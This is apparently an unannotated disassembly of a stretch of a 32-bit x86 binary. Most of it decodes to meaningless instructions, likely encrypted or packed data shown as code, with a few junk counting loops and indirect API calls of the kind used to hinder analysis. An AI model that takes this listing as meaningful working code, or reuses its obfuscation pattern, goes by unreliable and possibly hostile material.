  40725b:	call   0xf074a6d4
  407260:	dec    ecx
  407261:	(bad)  
  407262:	cld    
  407263:	dec    ebx
  407264:	sti    
  407265:	pop    edi
  407266:	mov    dh,0x51
  407268:	int    0xd6
  40726a:	sbb    eax,DWORD PTR [edx*8-0x4ba858b9]
  407271:	sub    DWORD PTR [ebx+0x6654906b],0x56686f0f
  40727b:	dec    edi
  40727c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40727d:	icebp  
  40727e:	mov    ds:0xf5c6faef,eax
  407283:	adc    DWORD PTR [ebp-0x24ed9d9],eax
  407289:	clc    
  40728a:	(bad)
  40728d:	mov    fs,WORD PTR [esi]
  40728f:	pop    es
  407290:	jnp    0x407296
  407292:	mov    bh,0x3f
  407294:	and    ecx,0xffffffbf
  407297:	aam    0xe4
  407299:	repnz enter 0xff9a,0xf
  40729e:	call   0x4962:0x484bf990
  4072a5:	jo     0x4072b9
  4072a7:	xor    eax,0x544c4b99
  4072ac:	int3   
  4072ad:	cmp    BYTE PTR [ecx+ecx*8+0x43],bh
  4072b1:	sub    eax,0xa33a1b5e
  4072b6:	inc    eax
  4072b7:	sub    eax,0xc305e77b
  4072bc:	(bad)  
  4072bd:	mov    al,0xf1
  4072bf:	pushf  
  4072c0:	mov    edx,DWORD PTR [ebp-0x20]
  4072c3:	mov    ebx,DWORD PTR [ebp-0x8]
  4072c6:	xor    edx,eax
  4072c8:	add    edx,ecx
  4072ca:	imul   edx,ebx
  4072cd:	cmp    edx,edi
  4072cf:	jbe    0x40619a
  4072d5:	pop    ebx
  4072d6:	jmp    0x407428
  4072db:	push   ds
  4072dc:	cld    
  4072dd:	dec    edi
  4072de:	or     ebp,DWORD PTR [ebp-0x27]
  4072e1:	jp     0x40728c
  4072e3:	adc    edi,0x95170f0c
  4072e9:	test   eax,0x7e18f88f
  4072ee:	jle    0x407313
  4072f0:	jg     0x407370
  4072f2:	jle    0x4072a6
  4072f4:	adc    DWORD PTR [edx+0x3e7d761b],0xffffffd2
  4072fb:	pop    ss
  4072fc:	iret   
  4072fd:	icebp  
  4072fe:	aam    0xdb
  407300:	cwde   
  407301:	sub    DWORD PTR [edx],edi
  407303:	and    BYTE PTR ds:0x3c579c31,ch
  407309:	jecxz  0x407341
  40730b:	out    0x41,al
  40730d:	inc    esi
  40730e:	mov    edi,0xd52f88e2
  407313:	or     al,0x34
  407315:	jle    0x407323
  407317:	jbe    0x4072da
  407319:	jb     0x4072e5
  40731b:	push   0x2b
  40731d:	cld    
  40731e:	sbb    BYTE PTR ss:[edx-0x76],cl
  407322:	loop   0x40737e
  407324:	or     BYTE PTR [edx+0x1a],0x29
  407328:	push   esp
  407329:	or     al,0xe6
  40732b:	sub    al,0xdf
  40732d:	retf   0x30a8
  407330:	lock sub eax,0xe40315c8
  407336:	test   al,0x4b
  407338:	out    0x5d,al
  40733a:	or     dl,BYTE PTR [esi-0x3c]
  40733d:	aam    0x36
  40733f:	outs   dx,DWORD PTR ds:[esi]
  407340:	lods   al,BYTE PTR ds:[esi]
  407341:	mov    al,0xa5
  407343:	jge    0x4072e3
  407345:	arpl   bp,bx
  407347:	jmp    0x19fe:0xef3c68b
  40734e:	test   eax,0x9fc01ff3
  407353:	push   esp
  407354:	jecxz  0x4073bc
  407356:	push   edx
  407357:	stos   BYTE PTR es:[edi],al
  407358:	fistp  QWORD PTR [ebp+0x40]
  40735b:	fsub   st(0),st
  40735d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40735e:	mov    ch,0xb1
  407360:	ins    DWORD PTR es:[edi],dx
  407361:	jmp    0x4073ad
  407363:	mov    dl,0x45
  407365:	xchg   ebp,eax
  407366:	mov    ds:0xe744a76,al
  40736b:	inc    ecx
  40736c:	test   eax,0x25b4b9a2
  407371:	mov    edx,ecx
  407373:	push   0xffffffc8
  407375:	xchg   DWORD PTR [edi],esp
  407377:	sahf   
  407378:	pop    esp
  407379:	pop    es
  40737a:	rol    DWORD PTR [esi+0x7fdcacf9],1
  407380:	push   cs
  407381:	lods   eax,DWORD PTR ds:[esi]
  407382:	test   eax,0x39622cce
  407387:	pop    ds
  407388:	sub    ah,BYTE PTR [edi]
  40738a:	and    BYTE PTR [ebx+0x3b],dl
  40738d:	aad    0x91
  40738f:	sbb    eax,0x5b5c0ff9
  407394:	sub    ah,BYTE PTR [ebp+eiz*2-0x31]
  407398:	leave  
  407399:	jno    0x407350
  40739b:	retf   
  40739c:	sub    ah,al
  40739e:	sub    DWORD PTR [ebp+0x6d],edx
  4073a1:	push   esi
  4073a2:	aad    0x3e
  4073a4:	pop    ecx
  4073a5:	in     al,0x62
  4073a7:	xchg   DWORD PTR [ebx-0x4d2546c9],ebx
  4073ad:	fadd   QWORD PTR [ebp*1-0x4df267b8]
  4073b4:	mov    bh,0xc6
  4073b6:	mov    bh,0xaf
  4073b8:	sti    
  4073b9:	push   esi
  4073ba:	xchg   cl,bl
  4073bc:	gs repnz in eax,0xb7
  4073c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073c1:	out    dx,al
  4073c2:	mov    ebp,0xb1b5e30d
  4073c7:	dec    edi
  4073c8:	nop
  4073c9:	cmc    
  4073ca:	add    al,0x2f
  4073cc:	pop    eax
  4073cd:	push   edi
  4073ce:	leave  
  4073cf:	push   edx
  4073d0:	test   BYTE PTR [ecx+0x16],al
  4073d3:	xchg   esp,eax
  4073d4:	jns    0x4073ea
  4073d6:	jmp    0x79d3dad9
  4073db:	and    BYTE PTR gs:[esi],dh
  4073de:	and    BYTE PTR [edx],al
  4073e0:	gs daa 
  4073e2:	cmp    edx,DWORD PTR [ebx+0x57]
  4073e5:	push   ds
  4073e6:	or     esp,DWORD PTR [edi]
  4073e8:	sbb    DWORD PTR [edi+0x23],0x26
  4073ec:	int    0xd
  4073ee:	adc    al,BYTE PTR [ebx]
  4073f0:	xchg   esi,eax
  4073f1:	push   ss
  4073f2:	pop    ds
  4073f3:	xor    esi,DWORD PTR [esi+0x783c4887]
  4073f9:	imul   eax,DWORD PTR [edx+0x7e67592c],0x3b
  407400:	fistp  WORD PTR [ecx-0x1cd2cb2b]
  407406:	fwait
  407407:	xor    BYTE PTR [edi],0x4d
  40740a:	adc    al,0x3f
  40740c:	sbb    BYTE PTR [edx+eax*2+0x38e4489d],bh
  407413:	cmp    eax,0x2e51c7a9
  407418:	out    0x3,eax
  40741a:	int3   
  40741b:	push   ebx
  40741c:	cmp    esp,DWORD PTR [edx+0xbd9533a]
  407422:	jge    0x407467
  407424:	out    dx,al
  407425:	cmp    BYTE PTR [edx-0x3d36a053],al
  40742b:	or     BYTE PTR [eax],al
  40742d:	push   ebp
  40742e:	mov    ebp,esp
  407430:	jmp    0x4075bc
  407435:	jb     0x407447
  407437:	test   eax,0x8a95a91d
  40743c:	adc    DWORD PTR [ebp+eax*1-0x4f27d801],edi
  407443:	test   al,0xa2
  407445:	lods   eax,DWORD PTR ds:[esi]
  407446:	sbb    DWORD PTR [esi+0x7e],edi
  407449:	jmp    0x93bef2cd
  40744e:	mov    ?,WORD PTR [eax+0x78]
  407451:	mov    dl,0xaa
  407453:	lds    esp,FWORD PTR [edx+0x30137ff1]
  407459:	test   al,0xae
  40745b:	sub    dl,BYTE PTR [edx]
  40745d:	jb     0x407437
  40745f:	xor    bl,ah
  407461:	mov    WORD PTR [ebx],ds
  407463:	xor    bl,ah
  407465:	mov    edi,DWORD PTR [edi+0x50456615]
  40746b:	stos   DWORD PTR es:[edi],eax
  40746c:	xor    al,0x9
  40746e:	dec    ebx
  40746f:	jno    0x4074ef
  407471:	pop    ebx
  407472:	mov    dl,0x44
  407474:	cs sub edi,0xffffffab
  407478:	pop    ebp
  407479:	pop    esi
  40747a:	sub    dl,BYTE PTR [esi+0x52f9daeb]
  407480:	aaa    
  407481:	and    cl,BYTE PTR [esi+0x7f95654d]
  407487:	scas   eax,DWORD PTR es:[edi]
  407488:	dec    esi
  407489:	and    DWORD PTR [edi-0x51],esp
  40748c:	push   ds
  40748d:	movd   DWORD PTR [eax-0x673d4d5c],mm6
  407494:	int3   
  407495:	adc    edi,DWORD PTR [ebx-0x41f5501]
  40749b:	bound  esi,QWORD PTR [eax+0x35]
  40749e:	popf   
  40749f:	pop    edi
  4074a0:	mov    eax,0x34b4b38c
  4074a5:	dec    ebx
  4074a6:	lea    edi,es:[ecx+ecx*1-0x561395d4]
  4074ae:	xor    al,0x55
  4074b0:	outs   dx,BYTE PTR ds:[esi]
  4074b1:	or     ecx,DWORD PTR [ebx-0x2f93bbdb]
  4074b7:	enter  0x718f,0x77
  4074bb:	cs jmp 0x6390:0xc05fc617
  4074c3:	loop   0x407522
  4074c5:	cmc    
  4074c6:	add    al,BYTE PTR [ecx]
  4074c8:	lods   eax,DWORD PTR ds:[esi]
  4074c9:	push   edi
  4074ca:	cmp    al,BYTE PTR [eax-0x62]
  4074cd:	add    DWORD PTR [esi+0x66],ebp
  4074d0:	cs jle 0x4074bf
  4074d3:	fist   WORD PTR [edx]
  4074d5:	rol    BYTE PTR [ebx+0x6e32e709],cl
  4074db:	icebp  
  4074dc:	out    dx,eax
  4074dd:	mov    dh,0xcb
  4074df:	call   0xfba0:0x6b45617
  4074e6:	div    edi
  4074e8:	aas    
  4074e9:	rcl    DWORD PTR [edi-0x24],cl
  4074ec:	mov    edi,0xce1aadb
  4074f1:	jg     0x40751a
  4074f3:	and    bl,BYTE PTR [eax]
  4074f5:	scas   eax,DWORD PTR es:[edi]
  4074f6:	mov    al,0xad
  4074f8:	sub    edi,0xc27f2249
  4074fe:	aas    
  4074ff:	mov    ecx,0x771d2b93
  407504:	fdiv   QWORD PTR [esi+0x7f007309]
  40750a:	pop    eax
  40750b:	adc    ecx,DWORD PTR [esi]
  40750d:	(bad)  
  40750e:	pop    esp
  40750f:	test   eax,0x65a39837
  407514:	or     eax,edi
  407516:	pop    ecx
  407517:	push   0xe16c8e06
  40751c:	nop
  40751d:	sub    al,0xab
  40751f:	cmp    eax,0xfe9b2362
  407524:	mov    eax,ds:0xc00afe77
  407529:	adc    al,cl
  40752b:	xchg   ecx,eax
  40752c:	pop    ds
  40752d:	in     al,dx
  40752e:	neg    edi
  407530:	lods   eax,DWORD PTR ds:[esi]
  407531:	add    ah,0x48
  407534:	push   edi
  407535:	bnd jbe 0x4074eb
  407538:	sub    al,ch
  40753a:	mov    ds:0xd924f67e,eax
  40753f:	cmp    al,0xc
  407541:	xor    eax,ebx
  407543:	push   0x12
  407545:	repnz inc ebx
  407547:	cs mov ebx,0xa323f3fa
  40754d:	(bad)  
  40754e:	arpl   WORD PTR [ebp-0x45258cad],si
  407554:	fldenv [edx-0xf2bc503]
  40755a:	pop    edx
  40755b:	mov    cl,0xf9
  40755d:	and    edx,DWORD PTR [ebp-0x6]
  407560:	mov    eax,ds:0xb536fe6b
  407565:	les    ebx,FWORD PTR [esi]
  407567:	ja     0x407570
  407569:	mov    ds:0x92451491,eax
  40756e:	xor    dl,BYTE PTR [eax-0x15]
  407571:	mov    ecx,0x98b9f0ae
  407576:	ret    
  407577:	add    eax,0x882eff76
  40757c:	jae    0x4075ca
  40757e:	jecxz  0x4075e0
  407580:	call   0x3b5:0x1017d33b
  407587:	mul    BYTE PTR cs:[eax+0x0]
  40758b:	push   esi
  40758c:	(bad)  
  40758d:	cs daa 
  40758f:	and    dl,BYTE PTR [esi-0x61dc24d7]
  407595:	dec    ebx
  407596:	lea    ecx,[eax-0x17]
  407599:	xlat   BYTE PTR ds:[ebx]
  40759a:	clc    
  40759b:	sub    al,0xd7
  40759d:	js     0x407540
  40759f:	mov    cl,0x75
  4075a1:	icebp  
  4075a2:	(bad)  
  4075a3:	jnp    0x4075f6
  4075a5:	cmp    BYTE PTR [edi-0x18e2ee15],ah
  4075ab:	cmp    eax,0xfdafece5
  4075b0:	mov    ebp,0x3357f0e2
  4075b5:	mov    esp,0x4b43833e
  4075ba:	jno    0x4075cc
  4075bc:	push   ecx
  4075bd:	push   ecx
  4075be:	and    DWORD PTR ds:0x41abce,0x0
  4075c8:	jmp    0x4075da
  4075cd:	mov    edx,DWORD PTR ds:0x41abce
  4075d3:	inc    edx
  4075d4:	mov    DWORD PTR ds:0x41abce,edx
  4075da:	cmp    DWORD PTR ds:0x41abce,0x1e
  4075e1:	jae    0x407619
  4075e7:	cmp    DWORD PTR ds:0x41abce,0x20
  4075ee:	jne    0x40760a
  4075f4:	push   DWORD PTR [ebp-0x28]
  4075f7:	push   0x365e
  4075fc:	push   DWORD PTR [ebp-0x18]
  4075ff:	push   0x4c62
  407604:	call   DWORD PTR ds:0x40d004
  40760a:	jmp    0x4075cd
  40760f:	xor    DWORD PTR ds:0x412374,0x3a52
  407619:	mov    eax,0xf89c8538
  40761e:	sub    ecx,ecx
  407620:	mov    DWORD PTR [ebp-0x8],eax
  407623:	and    DWORD PTR ds:0x41abd6,0x0
  40762d:	jmp    0x40763f
  407632:	mov    ecx,DWORD PTR ds:0x41abd6
  407638:	inc    ecx
  407639:	mov    DWORD PTR ds:0x41abd6,ecx
  40763f:	cmp    DWORD PTR ds:0x41abd6,0x1e
  407646:	jae    0x4076c6
  40764c:	cmp    DWORD PTR ds:0x41abd6,0x2d
  407653:	jne    0x40765f
  407659:	call   DWORD PTR ds:0x40d1d8
  40765f:	jmp    0x407632
  407664:	and    DWORD PTR ds:0x417e45,0x0
  40766e:	jmp    0x407680
  407673:	mov    edx,DWORD PTR ds:0x417e45
  407679:	inc    edx
  40767a:	mov    DWORD PTR ds:0x417e45,edx
  407680:	cmp    DWORD PTR ds:0x417e45,0x1b
  407687:	jae    0x4076c6
  40768d:	cmp    DWORD PTR ds:0x417e45,0x8
  407694:	jne    0x4076a5
  40769a:	push   0x41abea
  40769f:	call   DWORD PTR ds:0x40d1dc
  4076a5:	cmp    DWORD PTR ds:0x417e45,0x7
  4076ac:	jne    0x4076c1
  4076b2:	xor    edx,edx
  4076b4:	add    edx,DWORD PTR ds:0x417e45
  4076ba:	inc    edx
  4076bb:	mov    DWORD PTR ds:0x417e45,edx
  4076c1:	jmp    0x407673
  4076c6:	mov    DWORD PTR [ebp-0x4],0xf89c853b
  4076cd:	mov    edx,DWORD PTR [ebp-0x8]
  4076d0:	push   esi
  4076d1:	adc    esi,ecx
  4076d3:	mov    ecx,0x7510859
  4076d8:	xor    edx,ecx
  4076da:	mov    esi,0x32729f
  4076df:	push   edi
  4076e0:	mov    edi,DWORD PTR [ebp+0x10]
  4076e3:	add    edx,esi
  4076e5:	cmp    edi,edx
  4076e7:	jmp    0x407873
  4076ec:	iret   
  4076ed:	in     eax,0x74
  4076ef:	push   edx
  4076f0:	adc    al,0x63
  4076f2:	jns    0x40776d
  4076f4:	int    0x3e
  4076f6:	les    ebp,FWORD PTR [esi+0x37]
  4076f9:	ret    
  4076fa:	sub    DWORD PTR [ebx+0x1c],ebx
  4076fd:	pop    ds
  4076fe:	jle    0x40777e
  407700:	jmp    0xf3bef584
  407705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407706:	(bad)
  40770a:	jno    0x40776f
  40770c:	mov    ebx,0x42b0a7a9
  407711:	or     bl,BYTE PTR [eax+0x1e4f3966]
  407717:	test   eax,0x3b5ede51
  40771c:	outs   dx,DWORD PTR ds:[esi]
  40771d:	dec    edx
  40771e:	test   al,0xb5
  407720:	into   
  407721:	or     ah,BYTE PTR ds:0xc5444576
  407727:	mov    edx,0x4bd03779
  40772c:	ret    0x7c44
  40772f:	jle    0x4076fe
  407731:	mov    edx,0x97316d13
  407736:	ret    0xa631
  407739:	call   0xe4edfc7f
  40773e:	loopne 0x407793
  407740:	jae    0x407791
  407742:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407743:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407744:	arpl   bx,si
  407746:	jne    0x407778
  407748:	pop    esi
  407749:	in     al,dx
  40774a:	enter  0x442c,0x56
  40774e:	push   eax
  40774f:	(bad)  
  407750:	stc    
  407751:	pop    ecx
  407752:	std    
  407753:	push   ecx
  407754:	and    BYTE PTR [ecx+0x1f811e73],0x5c
  40775b:	cmp    esi,ebx
  40775d:	jge    0x4077d1
  40775f:	xor    eax,0xcd0f511d
  407764:	popa   
  407765:	push   esp
  407766:	imul   ecx,DWORD PTR [edx+eiz*2+0x68],0x89273ffb
  40776e:	push   edx
  40776f:	out    0xbc,al
  407771:	pushf  
  407772:	js     0x407728
  407774:	jbe    0x4077b3
  407776:	push   ss
  407777:	enter  0x4590,0xd9
  40777b:	cs aad 0xb0
  40777e:	mov    ecx,0x1022c7c4
  407783:	loope  0x407792
  407785:	outs   dx,DWORD PTR ds:[esi]
  407786:	pop    ds
  407787:	adc    eax,0xb1d83abd
  40778c:	sar    BYTE PTR ds:[esi+0xa],0xcd
  407791:	inc    eax
  407792:	sub    DWORD PTR ds:0x8435dd93,edi
  407798:	sub    esi,DWORD PTR [ecx+ebp*8]
  40779b:	push   es
  40779c:	pusha  
  40779d:	ins    BYTE PTR es:[edi],dx
  40779e:	out    dx,eax
  40779f:	push   ss
  4077a0:	fcom   DWORD PTR [ebx+0x23]
  4077a3:	test   eax,0x649cddcc
  4077a8:	xlat   BYTE PTR ds:[ebx]
  4077a9:	jl     0x4077c3
  4077ab:	cld    
  4077ac:	xchg   esp,eax
  4077ad:	mov    gs,WORD PTR [edi]
  4077af:	(bad)  
  4077b0:	gs pop es
  4077b2:	lods   eax,DWORD PTR ds:[esi]
  4077b3:	inc    edx
  4077b4:	sar    DWORD PTR [edi],1
  4077b6:	xchg   ebp,eax
  4077b7:	std    
  4077b8:	repnz (bad) 
  4077ba:	mov    esi,0xb63bdbe5
  4077bf:	retf   
  4077c0:	popf   
  4077c1:	pop    es
  4077c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077c3:	or     al,0x64
  4077c5:	ficom  WORD PTR [edi]
  4077c7:	cld    
  4077c8:	out    0x37,al
  4077ca:	shl    BYTE PTR [ecx],0x35
  4077cd:	imul   eax,DWORD PTR [esi-0x66],0xc4d3fe61
  4077d4:	cmc    
  4077d5:	mov    ds:0x48c0ea76,al
  4077da:	inc    edx
  4077db:	cwde   
  4077dc:	popa   
  4077dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077de:	fwait
  4077df:	cmc    
  4077e0:	in     al,0x5
  4077e2:	add    DWORD PTR [esi],ecx
  4077e4:	push   es
  4077e5:	lds    esp,FWORD PTR [ecx-0x72]
  4077e8:	jge    0x4077d0
  4077ea:	xor    bl,ch
  4077ec:	into   
  4077ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077ee:	or     esi,DWORD PTR [edi]
  4077f0:	sbb    DWORD PTR [ecx+ebx*1],edi
  4077f3:	iret   
  4077f4:	stos   DWORD PTR es:[edi],eax
  4077f5:	pop    ds
  4077f6:	jl     0x40781a
  4077f8:	ds xchg edx,eax
  4077fa:	dec    ebx
  4077fb:	(bad)  
  4077fc:	push   ss
  4077fd:	in     al,dx
  4077fe:	popa   
  4077ff:	push   esp
  407800:	ins    DWORD PTR es:[edi],dx
  407801:	retf   0xd212
  407804:	int    0x15
  407806:	lods   eax,DWORD PTR ds:[esi]
  407807:	in     al,dx
  407808:	ja     0x407869
  40780a:	daa    
  40780b:	rcr    ebp,1
  40780d:	adc    BYTE PTR [esi+0x4bd2084a],al
  407813:	inc    esi
  407814:	popa   
  407815:	cdq    
  407816:	fld    QWORD PTR [edi+0x68]
  407819:	xchg   edi,eax
  40781a:	and    ecx,DWORD PTR [eax+edx*8+0x541e6899]
  407821:	inc    esi
  407822:	loop   0x407889
  407824:	pop    ebx
  407825:	mov    cl,0x93
  407827:	jne    0x4077c8
  407829:	(bad)
  40782c:	mov    ds,WORD PTR [eax-0x1e6ad180]
  407832:	and    cl,BYTE PTR [eax]
  407834:	enter  0x5d64,0x7
  407838:	mov    eax,0x7eb692d6
  40783d:	jb     0x407824
  40783f:	dec    esi
  407840:	lock pop ebp
  407842:	int    0x92
  407844:	test   al,0x86
  407846:	adc    BYTE PTR [eax],0x51
  407849:	xchg   edi,eax
  40784a:	(bad)  
  40784b:	mov    eax,ds:0xf60e551
  407850:	lea    ecx,[eax]
  407852:	xor    eax,0xf550a1f5
  407857:	(bad)  
  407858:	sbb    al,0x3
  40785a:	mov    ecx,0xf313f330
  40785f:	nop
  407860:	cdq    
  407861:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407862:	fwait
  407863:	in     al,dx
  407864:	rol    DWORD PTR [edi-0x54ad5c5b],cl
  40786a:	scas   eax,DWORD PTR es:[edi]
  40786b:	ss inc edi
  40786d:	ss icebp 
  40786f:	out    0x5b,eax
  407871:	lods   eax,DWORD PTR ds:[esi]
  407872:	sahf   
  407873:	je     0x407c04
  407879:	jmp    0x407a05
  40787e:	in     eax,dx
  40787f:	(bad)  
  407880:	pop    esi
  407881:	jg     0x4078d7
  407883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407884:	ins    DWORD PTR es:[edi],dx
  407885:	in     eax,0x5e
  407887:	imul   eax,DWORD PTR [esi-0x21c13274],0xfffffff1
  40788e:	(bad)  
  40788f:	sbb    al,0x7e
  407891:	jle    0x40787c
  407893:	jg     0x407913
  407895:	jle    0x407860
  407897:	cmp    DWORD PTR [esi+0x2b6d0faa],esi
  40789d:	xchg   BYTE PTR [eax+0xd],ch
  4078a0:	pop    ecx
  4078a1:	stos   BYTE PTR es:[edi],al
  4078a2:	fist   WORD PTR [eax+ebx*1+0x59]
  4078a6:	inc    ecx
  4078a7:	loop   0x4078f1
  4078a9:	popf   
  4078aa:	leave  
  4078ab:	vandps ymm5,ymm4,YMMWORD PTR [edi-0x1f0d876b]
  4078b3:	lock pop esp
  4078b5:	dec    ecx
  4078b6:	daa    
  4078b7:	(bad)  [eax-0xf]
  4078ba:	pusha  
  4078bb:	xor    al,0x7
  4078bd:	xchg   esp,eax
  4078be:	ins    DWORD PTR es:[edi],dx
  4078bf:	es aaa 
  4078c1:	lea    esi,[ebp-0x80]
  4078c4:	inc    eax
  4078c5:	call   0x3cb1e637
  4078ca:	xchg   ecx,eax
  4078cb:	jmp    0x2d0d:0x72ed7ac1
  4078d2:	xor    al,BYTE PTR [ecx-0x5b]
  4078d5:	test   eax,0x1a00da91
  4078da:	and    edi,DWORD PTR [ecx+edx*8+0x22]
  4078de:	push   eax
  4078df:	cmp    eax,0xcbd5a935
  4078e4:	mov    bh,0x37
  4078e6:	xor    edx,eax
  4078e8:	jmp    0xd9e3:0x7b5b29d
  4078ef:	adc    DWORD PTR [ecx-0x4d],ebp
  4078f2:	mov    bh,0x80
  4078f4:	inc    esi
  4078f5:	inc    ebp
  4078f6:	mov    WORD PTR [esi+0xb],cs
  4078f9:	jo     0x4078b8
  4078fb:	adc    ecx,0x1ff78031
  407901:	gs pop ebx
  407903:	xor    al,0x4c
  407905:	ret    0x9388
  407908:	test   al,0x61
  40790a:	sahf   
  40790b:	stc    
  40790c:	or     DWORD PTR [eax-0x3e],0x179dcc14
  407913:	add    eax,0x15a7a87
  407918:	fnsave [ecx-0xce77e30]
  40791e:	xor    al,BYTE PTR [ebx]
  407920:	mov    esp,0x3794a60e
  407925:	dec    ebx
  407926:	(bad)  
  407927:	repz add ch,0xbe
  40792b:	stos   DWORD PTR es:[edi],eax
  40792c:	and    cl,BYTE PTR [edi+esi*4+0x52]
  407930:	cmp    DWORD PTR [eax],esp
  407932:	jb     0x4078ed
  407934:	pcmpeqd mm0,QWORD PTR [edi-0x2e83e897]
  40793b:	scas   eax,DWORD PTR es:[edi]
  40793c:	adc    DWORD PTR [ecx-0x27],ebx
  40793f:	and    edi,DWORD PTR [edi-0x50717c4e]
  407945:	dec    edx
  407946:	cmp    bh,bh
  407948:	mov    ebp,0xaab0640f
  40794d:	add    eax,0x5df339f0
  407952:	add    DWORD PTR [ebx-0x307897f4],esp
  407958:	out    0xd2,eax
  40795a:	xchg   ebx,eax
  40795b:	inc    edi
  40795c:	sbb    esi,DWORD PTR [eax+0x45838b3e]
  407962:	jle    0x407904
  407964:	enter  0xcab0,0xfd
  407968:	test   eax,0x32c51efb
  40796d:	out    dx,eax
  40796e:	inc    edx
  40796f:	xor    al,0x7a
  407971:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407972:	dec    esp
  407973:	cmp    ebx,ebx
  407975:	pop    esi
  407976:	sbb    al,BYTE PTR [esp+edi*4+0x39]
  40797a:	dec    esi
  40797b:	mov    eax,ds:0x6edfe926
  407980:	jmp    ebp
  407982:	sub    eax,0xef0adfb1
  407987:	fiadd  DWORD PTR [edi+0x8b73001]
  40798d:	je     0x407972
  40798f:	jl     0x40799b
  407991:	xor    esi,0x83cf0258
  407997:	shl    ch,1
  407999:	sub    DWORD PTR [esi-0x2e],ebx
  40799c:	xchg   edx,eax
  40799d:	loope  0x40797d
  40799f:	sbb    DWORD PTR [edx],0x5f3648e8
  4079a5:	(bad)  
  4079a7:	(bad)  
  4079a8:	push   ebx
  4079a9:	mov    ebp,0x389c4093
  4079ae:	jns    0x407a24
  4079b0:	pop    eax
  4079b1:	cmp    dl,dh
  4079b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079b4:	div    ah
  4079b6:	test   BYTE PTR [eax],cl
  4079b8:	jecxz  0x4079ca
  4079ba:	in     eax,0x1a
  4079bc:	push   es
  4079bd:	pop    esp
  4079be:	add    DWORD PTR [ebx],0xc4467926
  4079c4:	jbe    0x407a07
  4079c6:	mov    al,0x26
  4079c8:	mov    al,ds:0xbbf6ff3f
  4079cd:	cmp    DWORD PTR [ecx+edi*8],edi
  4079d0:	mov    cl,0x8e
  4079d2:	push   DWORD PTR [ebp-0x48f55b20]
  4079d8:	jle    0x4079a8
  4079da:	or     bl,BYTE PTR [eax+0x49fde6f6]
  4079e0:	fcmovu st,st(2)
  4079e2:	shl    BYTE PTR [ecx+0xb67aaca],cl
  4079e8:	mov    BYTE PTR [ebp+edx*8-0x2e],bl
  4079ec:	pusha  
  4079ed:	fistp  WORD PTR ds:0x30d57b1a
  4079f3:	xor    al,0xdf
  4079f5:	jns    0x407999
  4079f7:	out    0x1c,al
  4079f9:	mov    esp,0x923708b6
  4079fe:	inc    DWORD PTR [esp+ebp*8-0x25]
  407a02:	shl    dh,1
  407a04:	ja     0x407991
  407a06:	push   ebp
  407a07:	clc    
  407a08:	mov    eax,DWORD PTR [ebp-0x4]
  407a0b:	xor    eax,ecx
  407a0d:	mov    edi,0xffcd8d61
  407a12:	sub    edi,eax
  407a14:	jmp    0x407ba0
  407a19:	les    edi,FWORD PTR [eax]
  407a1b:	add    ch,BYTE PTR [edi-0x1e]
  407a1e:	gs jns 0x4079da
  407a21:	dec    esp
  407a22:	hlt    
  407a23:	sbb    BYTE PTR [ecx-0x24],0x7c
  407a27:	inc    ecx
  407a28:	sahf   
  407a29:	jle    0x407a3d
  407a2b:	jle    0x407aab
  407a2d:	jmp    0x8cbef8b1
  407a32:	sub    eax,0x6f796043
  407a37:	scas   eax,DWORD PTR es:[edi]
  407a38:	xor    DWORD PTR [esi-0x97ca425],0x4b
  407a3f:	and    DWORD PTR [ebx-0x33],ebx
  407a42:	lods   al,BYTE PTR ds:[esi]
  407a43:	(bad)  
  407a44:	sbb    BYTE PTR [edx-0x374900b8],cl
  407a4a:	push   ebp
  407a4b:	cs push 0xe631c08
  407a51:	loopne 0x407a0c
  407a53:	loop   0x407aa1
  407a55:	cmp    ecx,ebp
  407a57:	stos   DWORD PTR es:[edi],eax
  407a58:	ret    0xc85a
  407a5b:	or     DWORD PTR es:[ebp+0x35cd346a],ebp
  407a62:	cmp    DWORD PTR [edi+ebx*8+0x6b],esp
  407a66:	neg    BYTE PTR [ebx-0x62ab6836]
  407a6c:	dec    ebx
  407a6d:	arpl   WORD PTR [ebp-0x3f],ax
  407a70:	mov    ch,BYTE PTR [edi-0x30e56a8c]
  407a76:	arpl   WORD PTR [eax-0x41f01d6],bx
  407a7c:	jno    0x407a14
  407a7e:	test   BYTE PTR [edx+0x7713a2a3],cl
  407a84:	ret    
  407a85:	aad    0x69
  407a87:	adc    BYTE PTR [esi-0x3c],bl
  407a8a:	xchg   edi,eax
  407a8b:	outs   dx,DWORD PTR ds:[esi]
  407a8c:	les    edi,FWORD PTR [eax+0x58]
  407a8f:	mov    edx,0x5c0b92b8
  407a94:	push   eax
  407a95:	adc    eax,0x1e58c7ce
  407a9a:	mov    WORD PTR [edi],fs
  407a9c:	cmp    esi,DWORD PTR [ebp+0x1d81839a]
  407aa2:	push   ebx
  407aa3:	sbb    esi,DWORD PTR [esi-0x2f292d74]
  407aa9:	pushf  
  407aaa:	mov    ds:0xec3687be,eax
  407aaf:	repz fsub DWORD PTR [edx-0x57bfb03d]
  407ab6:	std    
  407ab7:	test   eax,0x6d4f895
  407abc:	fisub  WORD PTR [ecx+eiz*8-0x65]
  407ac0:	jge    0x407b32
  407ac2:	pop    esi
  407ac3:	or     DWORD PTR [esi+0x48ee2087],esi
  407ac9:	pop    ebp
  407aca:	fldcw  WORD PTR [eax*8-0x75ead553]
  407ad1:	(bad)  
  407ad2:	mov    eax,0x24249ddc
  407ad7:	mov    edx,0xefdf5fbf
  407adc:	fwait
  407add:	sub    al,0x32
  407adf:	sbb    DWORD PTR [ebp+edi*1+0x5d],0x15c1794c
  407ae7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ae8:	pop    ecx
  407ae9:	ja     0x407ae8
  407aeb:	push   cs
  407aec:	(bad)  
  407aed:	jnp    0x407a9d
  407aef:	call   0x3d8e:0x4b807ed7
  407af6:	stc    
  407af7:	sub    bl,BYTE PTR [ebx+ebx*8]
